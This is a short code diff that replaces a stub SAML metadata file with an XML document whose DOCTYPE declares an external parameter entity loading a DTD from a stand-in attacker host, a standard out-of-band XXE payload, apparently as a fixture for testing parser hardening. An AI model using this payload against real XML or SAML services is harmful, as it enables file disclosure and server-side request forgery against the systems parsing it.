@@ -1,3 +1,3 @@
-<EntityDescriptor>
-    <IDPSSODescriptor>
-</EntityDescriptor>
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://attacker.acme/test.dtd"> %xxe;]>
+<foo>bar</foo>
